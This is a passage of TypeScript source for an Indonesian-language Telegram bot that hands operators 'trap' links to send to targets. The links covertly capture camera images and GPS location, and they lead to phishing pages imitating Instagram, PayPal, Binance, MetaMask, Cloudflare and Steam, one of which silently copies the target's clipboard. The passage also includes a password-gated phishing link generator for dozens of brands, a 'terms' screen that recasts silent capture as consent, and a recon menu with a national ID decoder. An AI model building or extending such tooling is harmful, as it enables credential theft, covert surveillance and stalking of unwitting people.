                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Kirim Link ini kepada target. Saat diklik, Kamera target akan direkam tanpa UI mencolok.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Hasil foto (hingga 4 kali berulang) akan masuk ke chat ini secara otomatis jika disetujui.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_gps', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/gps_tracker/${id}`;
      ctx.reply(`📍 <b>PRECISION GPS TRACKER</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Kirim Link ini kepada target. Saat target memberikan akses lokasi, koordinat akan dilacak dengan Google Maps level presisi.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Pastikan target tidak menggunakan VPN palsu.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_ig', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/meta_login/${id}`;
      ctx.reply(`📸 <b>INSTAGRAM/META PHISHING OSINT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link ini menyamar sebagai peringatan keamanan (Security Alert) dari Instagram.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Target yang mengklik akan dimintai verifikasi sesi perlindungan akun.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_paypal', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/paypal/${id}`;
      ctx.reply(`💳 <b>PAYPAL SECURITY AUDIT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai peringatan aktivitas tidak wajar dari PayPal.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Sangat efektif dengan target platform Fintech.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_binance', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/binance/${id}`;
      ctx.reply(`💱 <b>BINANCE CRYPTO AUDIT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai halaman Withdrawal Security Binance.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Target harus memverifikasi sesi untuk melindungi aset dompet mereka.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_wallet', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/wallet_connect/${id}`;
      ctx.reply(`🦊 <b>WEB3 METAMASK SIGNATURE TRAP</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai halaman Web3 WalletConnect (MetaMask Signature).\n` +
                `Menyerang dengan stealth: langsung menyalin clipboard diam-diam saat target masuk.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Memancing pengguna Crypto untuk mengklik 'Connect Web3'.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_cloudflare', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/cloudflare/${id}`;
      ctx.reply(`☁️ <b>CLOUDFLARE EDGE TRAP</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai halaman antrian "Verify you are human" Cloudflare yang sangat terpercaya.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Salah satu penyamaran paling natural.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_steam', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/steam/${id}`;
      ctx.reply(`🎮 <b>STEAM GUARD INJECT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai verifikasi sekuritas akun Steam Guard.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Dirancang khusus untuk target demographics Gaming.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.start((ctx) => ctx.reply(getStartMsg(), { parse_mode: 'HTML', ...mainKeyboard }));

    bot.action('menu_main', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const safeName = (ctx.from?.first_name || 'ᴜꜱᴇʀ').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
      const txt = `<b>━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━</b>\n` +
        `<b>⚔️ ᴇʟɪᴛᴇ ᴏꜱɪɴᴛ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴠ.1</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👋 ʜᴀʟᴏ <b>${safeName}</b>,\n` +
        `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴄᴇɴᴛᴇʀ ᴏᴘᴇʀᴀꜱɪ. sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴏᴅᴜʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ:`;
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...mainKeyboard }).catch(() => {});
    });

    bot.action('menu_osint_basic', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ (ʙᴀꜱɪᴄ)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ᴘᴇʀɪɴᴛᴀʜ ᴅᴀꜱᴀʀ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ & ᴘᴇʀᴇᴛᴀꜱᴀɴ ɪɴꜰᴏ:\n\n` +
                  `• /ip [ɪᴘ_ᴀᴅᴅʀ] - ɪᴘ ɢᴇᴏ & ɪꜱᴘ ᴛʀᴀᴄᴋ\n` +
                  `• /domain [ᴅᴏᴍᴀɪɴ] - ᴡʜᴏɪꜱ & ᴅɴꜱ ʀᴇᴄᴏʀᴅꜱ\n` +
                  `• /phone_dork [ɴᴏᴍᴏʀ] - ᴄᴇᴋ ᴘʀᴏᴠɪᴅᴇʀ\n` +
                  `• /bininfo [ʙɪɴ_ɴᴜᴍ] - ᴄᴇᴋ ʙɪɴ ᴋᴀʀᴛᴜ ᴋʀᴇᴅɪᴛ\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🔍 ᴏꜱɪɴᴛ ɪɴᴅᴏ (ᴀᴅᴠ)', 'menu_osint_indo')],
        [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_wa', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      if (!ctx.from) return;
      if (ctx.from.id !== ADMIN_ID) {
        const txt = `🔒 <b>ꜰɪᴛᴜʀ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ᴛᴇʀᴋᴜɴᴄɪ</b>\n\n` +
                    `Mohon maaf, fitur integrasi WhatsApp Bot hanya dapat diakses dan digunakan oleh <b>Admin Owner</b> saja.`;
        const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
        ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
        return;
      }
      const txt = `<b>📲 ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ɪɴᴛᴇɢʀᴀᴛɪᴏɴ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ʜᴜʙᴜɴɢᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴋᴇ ɴᴏᴍᴏʀ ᴡʜᴀᴛꜱᴀᴘᴘ ᴀɴᴅᴀ ꜱᴇʙᴀɢᴀɪ ʙᴏᴛ ᴀᴋᴛɪꜰ!\n` +
                  `ꜱᴇᴍᴜᴀ ꜰɪᴛᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴋᴀɴ ᴛᴇʀꜱᴇᴅɪᴀ ᴅɪ ᴡʜᴀᴛꜱᴀᴘᴘ ᴀɴᴅᴀ.\n\n` +
                  `👉 <b>ᴄᴀʀᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ:</b>\n` +
                  `ᴋᴇᴛɪᴋ ᴘᴇʀɪɴᴛᴀʜ: <code>/wa_connect</code>\n\n` +
                  `⚠️ <b>ᴘᴇʀɪɴɢᴀᴛᴀɴ:</b>\n` +
                  `ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴏʀ ᴋᴇᴅᴜᴀ/ʙᴏᴛ, ᴊᴀɴɢᴀɴ ɴᴏᴍᴏʀ ᴘʀɪʙᴀᴅɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢʜɪɴᴅᴀʀɪ ʙᴀɴ.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_qr', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📱 ǫʀ ɢᴇɴᴇʀᴀᴛᴏʀ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ɢᴇɴᴇʀᴀᴛᴇ Qʀ ᴄᴏᴅᴇ ᴅᴀʀɪ ʟɪɴᴋ ᴀᴘᴀᴘᴜɴ!\n\n` +
                  `👉 <b>ᴄᴀʀᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ:</b>\n` +
                  `ᴋᴇᴛɪᴋ ᴘᴇʀɪɴᴛᴀʜ:\n<code>/qr [ʟɪɴᴋ ᴀᴛᴀᴜ ᴛᴇᴋꜱ ᴀɴᴅᴀ]</code>\n\n` +
                  `ᴄᴏɴᴛᴏʜ:\n<code>/qr https://google.com</code>\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_logger', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const id = generateTrapId(ctx.chat!.id);
      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ʙᴇʀɪᴋᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ:\n\n`;
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        msg += `📦 <b>${tmpl.name}</b>\n` +
               `🔗 <code>${trapUrl}</code>\n\n`;
      });
      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('💀 ꜱᴀɴᴛᴏ_ᴘᴇᴛʀᴜꜱ ᴠ.1', 'menu_santopetrus')],
        [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
      ]);
      ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
    });

    bot.action('menu_santopetrus', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      let msg = `💀 <b>SANTO_PETRUS V.1 PORTAL</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Modul Enterprise Security Audit (Phishing Simulator).\n\n` +
                `🔒 <b>FITUR TERKUNCI AUTHENTIKASI</b>\n` +
                `Gunakan command berikut dengan password untuk generate link payload:\n\n` +
                `<code>/santopetrus [PASSWORD] [TEMPLATE] [REDIRECT_URL]</code>\n\n` +
                `<b>Contoh Penggunaan:</b>\n` +
                `<code>/santopetrus PASSWORD_ANDA facebook https://google.com</code>\n\n` +
                `<i>Template yg tersedia: facebook, google, instagram, whatsapp, tiktok, twitter, telegram, netflix, spotify, microsoft, linkedin, github, paypal, discord, steam, reddit, binance, apple, amazon, roblox, playstation, xbox, snapchat, pinterest, twitch, canva, dropbox dll.</i>`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('◀️ KEMBALI', 'menu_logger')]
      ]);
      ctx.editMessageText(msg, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('santopetrus', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || args[1] !== '19281933') {
          return ctx.reply('🔒 <b>Akses Ditolak: Password SANTO_PETRUS salah atau tidak disertakan!</b>', {parse_mode: 'HTML'});
      }
      const template = args.length > 2 ? args[2] : 'facebook';
      const redirectUrl = args.length > 3 ? args[3] : 'https://google.com';
      
      const payload = Buffer.from(`${template}||${redirectUrl}`).toString('base64url');
      const trapUrl = `${appHost.replace(/\/$/, '')}/auth/santo-${payload}`;

      let msg = `💀 <b>SANTO_PETRUS V.1 GENERATED</b> 💀\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Tautan Simulasi Phishing berhasil di-generate:\n\n` +
                `📦 <b>TEMPLATE:</b> <code>${template}</code>\n` +
                `🌐 <b>REDIRECT:</b> <code>${redirectUrl}</code>\n\n` +
                `🔗 <b>LINK:</b>\n<code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Perhatian: Gunakan hanya untuk Security Audit. Administrator memantau.</i>`;
      ctx.reply(msg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.action('menu_osint_adv', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📡 OSINT & GLOBAL RECON</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Pusat intelijen dan pelacakan jejak digital. Semua perintah ada di bawah ini:\n\n` +
                  `🌐 <b>NETWORK & IP (ADVANCED):</b>\n` +
                  `• /ip [IP_ADDR] - Deteksi ISP, Geo Info.\n` +
                  `• /domain [URL] - Detail DNS, Whois.\n` +
                  `• /subdomain [DOM] - Deteksi sub server terkait.\n` +
                  `• /reverseip [IP_DOM] - Web tetangga dlm server.\n` +
                  `• /traceroute [IP_DOM] - Routing MTR Hops.\n` +
                  `• /asn [ASN_IP] - BGP IP Network info.\n` +
                  `• /zonetransfer [DOM] - Audit AXFR DNS Server.\n` +
                  `• /httpheaders [DOM] - Deteksi WAF firewall.\n` +
                  `• /scan [IP_DOM] - Nmap Fast Scan/Port.\n` +
                  `• /mac [MAC] - Cek Vendor Hardware.\n\n` +
                  `🕵️ <b>DIGITAL FOOTPRINT:</b>\n` +
                  `• /username [USER] - Footprint Tracker 150+ web.\n` +
                  `• /email [EMAIL] - Breach scan lookup.\n` +
                  `• /github_user [USER] - Profiling Git Dev.\n` +
                  `• /dork [QUERY] - Google Dorking generator.\n\n` +
                  `💰 <b>FINANCIAL & SECURITY:</b>\n` +
                  `• /bininfo [BIN] - Credit Card BIN Tracker.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🔍 OSINT INDO (Area Lokal)', 'menu_osint_indo')],
        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_osint_indo', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 OSINT INDONESIA CENTER</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Pusat pencarian dataset dan identitas lokal (Simulated/Public APIs): \n\n` +
                  `📍 <b>IDENTITAS KTP / KENDARAAN:</b>\n` +
                  `• /nik [16-DIGIT] - Cek Kode Wilayah KTP.\n` +
                  `• /plat [NO-PLAT] - Cek Asal Wilayah Plat (Reg Code).\n\n` +
                  `📞 <b>KOMUNIKASI:</b>\n` +
                  `• /phone_dork [NOMOR] - Cek HLR Provider & Link Whatsapp.\n` +
                  `• /sosmed [USER] - Cari di forum Lokal (Kaskus, Indowebster, dll).\n` +
                  `• /nama [NAMA] - Cari KPU/Data Publik (Dork Link).\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_osint_adv')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_games', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎮 COMPLEX MINI GAMES SET (20+ Games)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `<b>[CASINO & RNG]</b>\n` +
                  `• /roulette - Russian Roulette (Adrenalin!)\n` +
                  `• /dadu - Roll Multiple Dice.\n` +
                  `• /kartu - Draw a random deck card.\n` +
                  `• /coinflip - Heads or Tails.\n` +
                  `• /flip - Text flip.\n\n` +
                  `<b>[TEBAK-TEBAKAN LOGIKA]</b>\n` +
                  `• /tebakangka - Tebak Angka Sulit (1-100)\n` +
                  `• /tebaknegara - Guess the flag.\n` +
                  `• /tebakkata - Hangman Style Indonesia.\n` +
                  `• /tebakhewan - Clue based animal guessing.\n` +
                  `• /susunkata - Scrambled words.\n` +
                  `• /math - Advanced Fast Math quiz.\n` +
                  `• /morse - Morse Decode Quiz.\n\n` +
                  `<b>[PREDIKSI & MISTIK]</b>\n` +
                  `• /khodam [NAMA] - Cek khodam.\n` +
                  `• /ramal [NAMA] - AI Prediction (Future).\n` +
                  `• /jodoh [NAMA] [NAMA2] - Love calculator.\n` +
                  `• /tarot - 3 Card Reading Spiritual.\n` +
                  `• /8ball [TANYA] - Magic 8 ball oracle.\n\n` +
                  `<b>[SOSIAL & LAINNYA]</b>\n` +
                  `• /suit - Gunting Batu Kertas.\n` +
                  `• /werewolf - Multi-scenario simulation AI.\n` +
                  `• /tod - Truth or Dare randomizer.\n` +
                  `• /gombal - Flirting AI Generator.\n` +
                  `• /doa - Random Doa Islam.\n` +
                  `• /joke - Random Dark Joke.\n` +
                  `• /meme - Fetch Meme.\n` +
                  `• /fact - Useless Facts.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tools', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🛠️ ADVANCED UTILITY TOOLS</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Kumpulan alat enkripsi, formatter, utility IT complex:\n\n` +
                  `🔐 <b>CRYPTOGRAPHY:</b>\n` +
                  `• /b64enc [TEKS] - Base64 Encoder.\n` +
                  `• /b64dec [TEKS] - Base64 Decoder.\n` +
                  `• /hash [TEKS] - MD5 Hashing.\n` +
                  `• /sha256 [TEKS] - SHA-256 Hashing secure.\n` +
                  `• /pwd [LENGTH] - Random Strong PW Gen.\n` +
                  `• /uuid - Generate UUID V4.\n\n` +
                  `🌐 <b>WEB TOOLS:</b>\n` +
                  `• /qr [URL] - HD QR Code Gen.\n` +
                  `• /shortlink [URL] - TinyURL Generator.\n` +
                  `• /port [PORT] - Cek deskripsi service port.\n` +
                  `• /xss [URL] - XSS Vuln Scanner (Bug Hunter).\n\n` +
                  `📊 <b>DATA / API UTILS:</b>\n` +
                  `• /weather [KOTA] - Info Cuaca API.\n` +
                  `• /crypto_price [COIN] - WebScrape Harga Kripto.\n` +
                  `• /github [USER] - Fetch GH Stats.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_media', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎵 ᴍᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ</b>\n` +
                  `• /lagu [ᴊᴜᴅᴜʟ]\n` +
                  `• /play [ᴊᴜᴅᴜʟ]\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_alarm', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>⏰ ᴀʟᴀʀᴍ sʏꜱᴛᴇᴍ</b>\n` +
                  `• /alarm [ᴍᴇɴɪᴛ]\n` +
                  `• /listalarm\n`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_help', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>ℹ️ ɪɴꜰᴏʀᴍᴀꜱɪ & ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ʜᴏꜱᴛ: <code>${appHost}</code>\n` +
                  `ꜱᴛᴀᴛᴜꜱ: 🟢 ᴏɴʟɪɴᴇ\n\n` +
                  `<b>📜 ᴘᴏʟɪꜱɪ ᴋᴇᴀᴍᴀɴᴀɴ (USER AGREEMENT):</b>\n` +
                  `ꜱɪꜱᴛᴇᴍ ᴍᴇɴᴅᴇᴛᴇᴋꜱɪ ᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴜɴᴛᴜᴋ ᴘᴇʀʟɪɴᴅᴜɴɢᴀɴ ꜱᴇꜱɪ ᴅᴀʀɪ ᴀɴᴄᴀᴍᴀɴ ᴅᴇᴇᴘ-ꜰᴀᴋᴇ.\n\n` +
                  `1. Pengguna menyatakan mematuhi seluruh aturan platform.\n` +
                  `2. Semua akses audit sistem disetujui.\n` +
                  `3. Sistem beroperasi di bawah otoritas penuh.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tos', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ (TOS/EULA)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `⚠️ <b>PERINGATAN: KONTROL SITUASI KETAT & TRANSPARANSI</b>\n\n` +
                  `Sistem ini menggunakan kriteria peninjauan forensik dan telemetri kepatuhan. Guna menjamin tidak terjadinya penyalahgunaan (anti-abuse) dan memelihara kepatuhan audit tim internal:\n\n` +
                  `1. <b>By-Design Flaws (CVE-2026-X):</b> Segala data (IP, GPU, STUN leak) yang terambil secara "Silent" diklaim sebagai "Diagnostic Telemetry" untuk anti-bot.\n` +
                  `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info.\n` +
                  `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas.\n` +
                  `4. <b>ADMIN MONITORING & TRANSPARENCY POLICY:</b> Seluruh tautan logger dan hasil pelacakan yang digunakan oleh seluruh operator/member dalam sistem ini ditransmisikan dan disalin ("mirroring") secara realtime ke ID Admin Utama (Admin Owner). Hal ini bertujuan untuk pengawasan ketat, mencegah tindakan ilegal di luar otorisasi tim, serta penegakan disiplin (kick/ban) bagi pelanggar kebijakan internal perusahaan.\n` +
                  `5. <b>SANTO_PETRUS V.1:</b> Fitur ini adalah alat Enterprise Security Audit (Phishing Simulator). Menggunakan modul ini terhadap target publik tanpa izin adalah terlarang. Jika ada oknum yang berani macam-macam, langsung di-KICK dan diasingkan dari wilayah grup tanpa peringatan.\n\n` +
                  `<i>"Pengawasan ketat menjamin keamanan sistem dan integritas fungsi audit."</i>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `✅ <b>DENY UNAPPROVED ACTION. STRICT ADMIN AUDITING ACTIVE.</b>`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('nik', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /nik 3201010101900001");
      const nik = args[1];

      if (!/^\d{16}$/.test(nik)) {
        return ctx.reply("❌ Format Salah: NIK harus terdiri dari 16 digit angka.");
      }

      try {
        const parsed = nikParser(nik);
        const jkStr = parsed.kelamin() === 'pria' ? 'Laki-laki 👨' : parsed.kelamin() === 'wanita' ? 'Perempuan 👩' : 'Unknown 👤';
        
        let bornDateStr = 'Unknown';
        try {
          const d = parsed.lahir();
          if (d) {
            const bornDate = d instanceof Date ? d : new Date(d);
            if (!isNaN(bornDate.getTime())) {
              const day = String(bornDate.getDate()).padStart(2, '0');
              const month = String(bornDate.getMonth() + 1).padStart(2, '0');
              const year = bornDate.getFullYear();
              bornDateStr = `${day}-${month}-${year}`;
            }
          }
        } catch (err) {}

        const reply = `<b>🇮🇩 DATA NIK DECODER</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>NIK:</b> <code>${nik}</code>\n` +
                      `👤 <b>Gender:</b> ${jkStr}\n` +
                      `📅 <b>Tanggal Lahir:</b> <code>${bornDateStr}</code>\n` +
                      `📍 <b>Informasi Wilayah:</b>\n` +
                      `├ <b>Provinsi:</b> ${parsed.province() || 'Unknown'}\n` +
                      `├ <b>Kabupaten/Kota:</b> ${parsed.kabupatenKota() || 'Unknown'}\n` +
                      `├ <b>Kecamatan:</b> ${parsed.kecamatan() || 'Unknown'}\n` +
                      `└ <b>Kode Pos (Estimasi):</b> <code>${parsed.kodepos() || 'Unknown'}</code>\n` +
                      `🔢 <b>Nomor Urut:</b> <code>${parsed.uniqcode() || nik.substring(12, 16)}</code>\n` +
                      `🤖 <b>Status Validasi:</b> ${parsed.isValid() ? '✅ VALID (Database Cocok)' : '⚠️ STRUKTUR COCOK (Format Benar)'}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Analisis selesai dengan data wilayah penuh.</i>`;

        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch (e) {
        const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };
        const prov = nik.substring(0, 2);
        const kab = nik.substring(2, 4);
        const kec = nik.substring(4, 6);
        let tgl = parseInt(nik.substring(6, 8), 10);
        const bln = nik.substring(8, 10);
